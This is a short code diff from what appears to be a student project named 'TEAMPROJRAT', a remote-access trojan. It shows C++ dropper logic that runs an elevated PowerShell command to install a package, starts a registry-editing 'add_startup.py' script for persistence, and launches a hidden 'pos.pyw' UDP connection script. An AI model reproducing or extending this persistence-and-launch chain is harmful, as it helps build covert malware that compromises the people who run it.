@@ -20,7 +20,7 @@ int main()
     Sleep(10000);
     system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c pip install openpyxl'"); //openpyxl is needed to run pos.py
     Sleep(2000);
-    system("start /WAIT powershell Start-Process cmd -ArgumentList '/c cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\persistence\\\" && python add_startup.py'"); //starts the registry editing py file after python is installed
+    system("python 'C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\persistence\\add_startup.py'"); //starts the registry editing py file after python is installed
     system("cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
     system("exit");
     return 0;
